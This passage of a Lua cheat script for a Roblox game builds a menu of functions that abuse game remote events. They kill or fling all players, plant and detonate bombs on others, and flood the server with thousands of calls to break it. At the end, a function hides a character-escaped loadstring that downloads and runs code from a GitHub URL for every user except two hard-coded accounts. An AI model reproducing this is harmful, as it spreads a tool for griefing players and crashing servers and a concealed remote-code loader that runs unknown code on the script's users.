	Callback = function(Value)
		if Value == "Kill All" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Evil Duck" then
       v.Parent = LP.Character
   end
end

wait(0.5)

KillAll = Value
while KillAll do
        local plr = game:GetService("Players").LocalPlayer
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    if v.ClassName == "Player" and v.Name ~= plr.Name then
        if v.Character:FindFirstChild("HumanoidRootPart") then
            v.Character.HumanoidRootPart.CFrame = CFrame.new(plr.Character.HumanoidRootPart.Position)
        end
    end
end
    task.wait(0.1)
end
		end
	end    
})

Tab:AddButton({
 Name = "Destroy ping",
 Callback = function()
 Notification:Notify(
    {Title = "BendyHubX", Description = "Put on a stop time"},
    {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "default"}
)
        while game:GetService("RunService").RenderStepped:wait() do
game:GetService("Players").LocalPlayer.Character.Timestop.Stop:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "FPS Destroy",
 Callback = function()
 Notification:Notify(
    {Title = "BendyHubX", Description = "Put on a tree tool"},
    {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 5, Type = "default"}
)
        for i = 1, 500 do
a = math.random(-300, 300)
b = math.random(45, 45)
c = math.random(-300, 300)
local args = {
    [1] = Vector3.new(a, b, c)
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Wise Mystical Tree").Create:FireServer(unpack(args))
end
   end    
})

Tab:AddDropdown({
	Name = "Break server",
	Default = "1",
	Options = {"Break server v1", "Break server v2", "Break server v3"},
	Callback = function(Value)
		if Value == "Break server v1" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Timestop" then
       v.Parent = LP.Character
   end
end
		for i = 1, 3000 do
game:GetService("Players").LocalPlayer.Character.Timestop.Stop:FireServer()
end
		end
		if Value == "Break server v2" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Wise Mystical Tree" then
       v.Parent = LP.Character
   end
end
		for _, npc in ipairs(workspace:GetChildren()) do
            local args = {
    [1] = npc
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Wise Mystical Tree").Create:FireServer(unpack(args))
    end
		end
		if Value == "Break server v3" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Winning Knife" then
       v.Parent = LP.Character
   end
end
		for _, npc in ipairs(workspace:GetChildren()) do
            local args = {
    [1] = npc
}

game:GetService("Players").LocalPlayer.Character:FindFirstChild("Winning Knife").Throw:FireServer(unpack(args))
    end
		end
	end    
})

local Section = Tab:AddSection({
 Name = "Antis"
})

Tab:AddToggle({
	Name = "Anti Bazooka",
	Default = false,
	Callback = function(Value)
		polh = Value
		if polh == true then
		local plr = game.Players.LocalPlayer
local char = plr.Character
  
  for _, child in pairs(char:GetChildren()) do
    if child:IsA("BasePart") then
      child.Massless = false
      child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, math.huge, math.huge) 
    end
  end
		end
		if polh == fasle then
		local plr = game.Players.LocalPlayer
local char = plr.Character
SwEF = 1
  
  for _, child in pairs(char:GetChildren()) do
    if child:IsA("BasePart") then
      child.Massless = false
      child.CustomPhysicalProperties = PhysicalProperties.new(SwEF, SwEF, SwEF) 
    end
  end
  end
	end    
})

Tab:AddToggle({
	Name = "Anti Stop Time",
	Default = false,
	Callback = function(Value)
	local AST = Value
while AST do
  wait()
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
   task.spawn(function()
    for i, x in next, v.Character:GetDescendants() do
     if x.Name ~= floatName and x:IsA("BasePart") and x.Anchored then
      x.Anchored = false
     end
    end
   end)
end
end
	end    
})

Tab:AddToggle({
	Name = "Anti Evil Duck",
	Default = false,
	Callback = function(Value)
		Unkill = Value
while Unkill do
if Unkill == true then
local player = game:GetService("Players").LocalPlayer
local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
for _, part in ipairs(parts) do
part.CanTouch = fasle
end
end
if Unkill == fasle then
local player = game:GetService("Players").LocalPlayer
local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
for _, part in ipairs(parts) do
part.CanTouch = true
end
end
wait()
end
	end    
})

Tab:AddToggle({
	Name = "Auto Cheese",
	Default = false,
	Callback = function(Value)
	Seey = Value
 while Seey do task.wait()
 local LP = game.Players.LocalPlayer
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Cheese" then
       v.Parent = LP.Character
   end
end
   for i,v in pairs (LP.Character:GetChildren()) do
       if v.Name == "Cheese" then
           v:Activate()
       end
   end
end
	end    
})

Tab:AddToggle({
	Name = "Auto Detonate Bombs",
	Default = false,
	Callback = function(Value)
	local ADB = Value
	    while ADB do
	wait(0.3)
	game:GetService("Players").LocalPlayer.Backpack["Uncanny Bombs"].Detonate:FireServer()
        end
	end    
})

Tab:AddToggle({
	Name = "Anti Shocker",
	Default = false,
	Callback = function(Value)
	local ASh = Value
	while ASh do task.wait()
local player = game.Players.LocalPlayer
    if player.Character.Humanoid.Sit then
        player.Character.Humanoid.Sit = fasle
   end
  end
	end    
})

local Section = Tab:AddSection({
 Name = "Higher Techniques"
})

Tab:AddButton({
 Name = "Devil duck: Black Hole",
 Callback = function()
game.Players.LocalPlayer.Character:FindFirstChild("Evil Duck").Parent = game.Players.LocalPlayer.Character
  wait(0.5)
        local function findHumanoids(target)
    local humanoids = {}
    for _, descendant in ipairs(target:GetDescendants()) do
        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
            table.insert(humanoids, descendant)
        end
    end
    return humanoids
end

local function pullHumanoids(target)
    local humanoids = findHumanoids(target)
    for _, humanoid in ipairs(humanoids) do
        local args = {
            [1] = humanoid.RootPart
        }
        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
    end
end

while wait() do
pullHumanoids(workspace) 
end
   end    
})

Tab:AddButton({
 Name = "Devil duck: Fly all",
 Callback = function()
        local function findHumanoids(target)
    local humanoids = {}
    for _, descendant in ipairs(target:GetDescendants()) do
        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
            table.insert(humanoids, descendant)
        end
    end
    return humanoids
end

local function pullHumanoids(target)
    local humanoids = findHumanoids(target)
    for _, humanoid in ipairs(humanoids) do
        local args = {
            [1] = humanoid.RootPart
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
    end
end

pullHumanoids(workspace)
   end    
})

Tab:AddButton({
 Name = "Devil Duck: Fly all+",
 Callback = function()
        local players = game:GetService("Players"):GetPlayers()

for _, player in ipairs(players) do
local tools = player.Backpack:GetChildren()

for _, tool in ipairs(tools) do
        if tool.Name == "Evil Duck" then
local function findHumanoids(target)
    local humanoids = {}
    for _, descendant in ipairs(target:GetDescendants()) do
        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
            table.insert(humanoids, descendant)
        end
    end
    return humanoids
end

local function pullHumanoids(target)
    local humanoids = findHumanoids(target)
    for _, humanoid in ipairs(humanoids) do
        local args = {
            [1] = humanoid.RootPart
        }
        player.Backpack:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
    end
end

pullHumanoids(workspace)
  end
 end 
end
   end    
})

Tab:AddToggle({
 Name = "Devil duck: Fly Aura",
 Default = false,
 Callback = function(Value)
        ty = Value
        while ty do
   task.wait()
local closestDistance = math.huge
                    local closestHumanoid = nil
                    local Usuario = game.Players.LocalPlayer

                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
                            local distance =
                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
                            if distance < closestDistance and distance <= 100 then
                                closestDistance = distance
                                closestHumanoid = v
                            end
                        end
                    end

                    if closestHumanoid and closestHumanoid.Health ~= 0 then
                       local args = {
            [1] = closestHumanoid.RootPart
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Evil Duck").Pull:FireServer(unpack(args))
                    end
    end
   end    
})

Tab:AddButton({
 Name = "Uncanny Bombs: Ring Of Death",
 Callback = function()
        local function spawnPlantCircle(centerPosition, radius, plantType, numPlants)
    local angleIncrement = (2 * math.pi) / numPlants
    for i = 1, numPlants do
        local angle = angleIncrement * (i - 1)
        local x = centerPosition.X + radius * math.cos(angle)
        local z = centerPosition.Z + radius * math.sin(angle)
        local position = Vector3.new(x, centerPosition.Y, z)

        local args = {
            [1] = position,
            [2] = plantType
        }

        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end
end

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local torso = char:WaitForChild("Torso")

local radius = 150
local plantType = "supercanny"
local numPlants = 50

spawnPlantCircle(torso.Position, radius, plantType, numPlants)
wait(0.4)
game:GetService("Players").LocalPlayer.Backpack["Uncanny Bombs"].Detonate:FireServer()
   end    
})

Tab:AddToggle({
 Name = "Uncanny Bombs: Explosion Aura",
 Default = false,
 Callback = function(Value)
        tya = Value
        while tya do
   task.wait()
local closestDistance = math.huge
                    local closestHumanoid = nil
                    local Usuario = game.Players.LocalPlayer

                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
                            local distance =
                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
                            if distance < closestDistance and distance <= 150 then
                                closestDistance = distance
                                closestHumanoid = v
                            end
                        end
                    end

                    if closestHumanoid and closestHumanoid.Health ~= 0 then
                       local args = {
            [1] = closestHumanoid.RootPart.Position,
            [2] = "uncanny"
        }

        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
                    end
    end
   end    
})

Tab:AddButton({
 Name = "Uncanny Bombs: Explode all",
 Callback = function()
        local players = game:GetService("Players"):GetPlayers()

for _, player in ipairs(players) do
local tools = player.Backpack:GetChildren()

for _, tool in ipairs(tools) do
        if tool.Name == "Uncanny Bombs" then
local function findHumanoids(target)
    local humanoids = {}
    for _, descendant in ipairs(target:GetDescendants()) do
        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
            table.insert(humanoids, descendant)
        end
    end
    return humanoids
end

local function pullHumanoids(target)
    local humanoids = findHumanoids(target)
    for _, humanoid in ipairs(humanoids) do
        local args = {
            [1] = humanoid.RootPart.Position,
            [2] = "supercanny"
        }

        player.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end
end

pullHumanoids(workspace)
  elseif player.Character:FindFirstChild("Uncanny Bombs") then
  local function findHumanoids(target)
    local humanoids = {}
    for _, descendant in ipairs(target:GetDescendants()) do
        if descendant:IsA("Humanoid") and descendant.Parent ~= game.Players.LocalPlayer.Character then
            table.insert(humanoids, descendant)
        end
    end
    return humanoids
end

local function pullHumanoids(target)
    local humanoids = findHumanoids(target)
    for _, humanoid in ipairs(humanoids) do
        local args = {
            [1] = humanoid.RootPart.Position,
            [2] = "supercanny"
        }

        player.Character:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end
end

pullHumanoids(workspace)
  end
 end
end
   end    
})

Tab:AddButton({
 Name = "Uncanny Bombs: Domain Expansion",
 Callback = function()
        local ohInstance1 = game:GetService("Players").LocalPlayer
local ohString2 = "7817341182"
local ohString3 = "1"
local ohString4 = "0"

game:GetService("Players").LocalPlayer.PlayerGui.Radio.Remote:FireServer(ohInstance1, ohString2, ohString3, ohString4)
wait(3)

local function spawnPlantSphere(centerPosition, radius, plantType, numPlants)
    local goldenRatio = (1 + math.sqrt(5)) / 2
    local angleIncrement = 2 * math.pi * goldenRatio -- Use golden ratio for better distribution

    for i = 1, numPlants do
        local angle = angleIncrement * i
        local phi = math.acos(1 - 2 * (i - 1) / (numPlants - 1))
        local x = radius * math.sin(phi) * math.cos(angle)
        local y = radius * math.sin(phi) * math.sin(angle)
        local z = radius * math.cos(phi)
        local position = centerPosition + Vector3.new(x, y, z) -- Use Vector3 addition for position

        local args = {
            [1] = position,
            [2] = plantType
        }

        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end
end

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local torso = char:WaitForChild("Torso")

for i = 1, 2 do
local radius = 80 * (i * 1.5)
local plantType = "supercanny"
local numPlants = 300

spawnPlantSphere(torso.Position, radius, plantType, numPlants) 
end

local ohInstance1 = game:GetService("Players").LocalPlayer
local ohString2 = "7817367014"
local ohString3 = "1"
local ohString4 = "1"

game:GetService("Players").LocalPlayer.PlayerGui.Radio.Remote:FireServer(ohInstance1, ohString2, ohString3, ohString4)
wait(0.5)
game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
   end    
})

Tab:AddButton({
 Name = "Uncanny Bombs: Lazer Beams Tools",
 Callback = function()
        local tool = Instance.new("Tool")
tool.Name = "Lazer Beam"
tool.RequiresHandle = false

tool.Activated:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hu = char.Humanoid
local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
local playerForward = humanoidRootPart.CFrame.LookVector
local startPos = humanoidRootPart.Position + 20 * playerForward

local numUzumaki = 64
local spacing = 5

for i = 1, numUzumaki do
    local position = startPos + ((i - 1) * spacing * playerForward)
local args = {
            [1] = position,
            [2] = "uncanny"
        }

 game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
end
game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack

local tool = Instance.new("Tool")
tool.Name = "Lazer Beam+"
tool.RequiresHandle = false

tool.Activated:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hu = char.Humanoid
local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
local playerForward = humanoidRootPart.CFrame.LookVector
local startPos = humanoidRootPart.Position + 55 * playerForward

local numUzumaki = 48
local spacing = 10

for i = 1, numUzumaki do
    local position = startPos + ((i - 1) * spacing * playerForward)
local args = {
            [1] = position,
            [2] = "canny"
        }

 game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
end
game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack

local tool = Instance.new("Tool")
tool.Name = "Lazer Beam++"
tool.RequiresHandle = false

tool.Activated:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hu = char.Humanoid
local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
local playerForward = humanoidRootPart.CFrame.LookVector
local startPos = humanoidRootPart.Position + 130 * playerForward

local numUzumaki = 64
local spacing = 80

for i = 1, numUzumaki do
    local position = startPos + ((i - 1) * spacing * playerForward)
local args = {
            [1] = position,
            [2] = "supercanny"
        }

 game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
end
game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
   end    
})

Tab:AddButton({
 Name = "Uncanny Bombs: Wide Lazer Beams Tools",
 Callback = function()
        local tool = Instance.new("Tool")
tool.Name = "Wide Lazer Beam"
tool.RequiresHandle = false

tool.Activated:Connect(function()
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hu = char.Humanoid
    local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
    local playerForward = humanoidRootPart.CFrame.LookVector
    local startPos = humanoidRootPart.Position + 20 * playerForward
    local playerCFrame = humanoidRootPart.CFrame

    local numUzumaki = 64
    local spacing = 10
    local sideOffset = 20

    for i = 1, numUzumaki do
        local position = startPos + ((i - 1) * spacing * playerForward)
        local args = {
            [1] = position,
            [2] = "uncanny"
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end

    for i = 1, numUzumaki do
        local leftPos = startPos - playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
        local args = {
            [1] = leftPos,
            [2] = "uncanny"
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end

    for i = 1, numUzumaki do
        local rightPos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
        local args = {
            [1] = rightPos,
            [2] = "uncanny"
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end
    game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack

local tool = Instance.new("Tool")
tool.Name = "Wide Lazer Beam+"
tool.RequiresHandle = false

tool.Activated:Connect(function()
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hu = char.Humanoid
    local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
    local playerForward = humanoidRootPart.CFrame.LookVector
    local startPos = humanoidRootPart.Position + 55 * playerForward
    local playerCFrame = humanoidRootPart.CFrame

    local numUzumaki = 48
    local spacing = 30
    local sideOffset = 45

    for i = 1, numUzumaki do
        local position = startPos + ((i - 1) * spacing * playerForward)
        local args = {
            [1] = position,
            [2] = "canny"
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end

    for i = 1, numUzumaki do
        local leftPos = startPos - playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
        local args = {
            [1] = leftPos,
            [2] = "canny"
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end

    for i = 1, numUzumaki do
        local rightPos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset, 0, 0)) + ((i - 1) * spacing * playerForward)
        local args = {
            [1] = rightPos,
            [2] = "canny"
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end
    game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack

local tool = Instance.new("Tool")
tool.Name = "Wide Lazer Beam++"
tool.RequiresHandle = false

tool.Activated:Connect(function()
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hu = char.Humanoid
    local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
    local playerForward = humanoidRootPart.CFrame.LookVector
    local startPos = humanoidRootPart.Position + 130 * playerForward
    local playerCFrame = humanoidRootPart.CFrame

    local numUzumaki = 64
    local spacing = 75
    local sideOffset = 100
    local additionalSideOffset = 50

    for i = 1, numUzumaki do
        local position = startPos + ((i - 1) * spacing * playerForward)
        local args = {
            [1] = position,
            [2] = "supercanny"
        }
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
    end

    for j = 1, 2 do
        for i = 1, numUzumaki do
            local sidePos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new(sideOffset * j, 0, 0)) + ((i - 1) * spacing * playerForward)
            local args = {
                [1] = sidePos,
                [2] = "supercanny"
            }
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))

            local additionalSidePos = startPos + playerCFrame:VectorToWorldSpace(Vector3.new((sideOffset + additionalSideOffset) * j, 0, 0)) + ((i - 1) * spacing * playerForward)
            local args = {
                [1] = additionalSidePos,
                [2] = "supercanny"
            }
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Plant:FireServer(unpack(args))
        end
    end

    game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Uncanny Bombs").Detonate:FireServer()
end)

tool.Parent = game.Players.LocalPlayer.Backpack
   end    
})

local function DS()
  if game.Players.LocalPlayer.UserId ~= 4636825706 and game.Players.LocalPlayer.UserId ~= 5042713445 then
   loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\68\83\75\101\114\79\102\102\105\99\97\108\47\68\101\102\101\110\115\101\79\102\102\47\109\97\105\110\47\83\117\107\117\110\97\34\41\41\40\41\10")()
  end
end

DS()
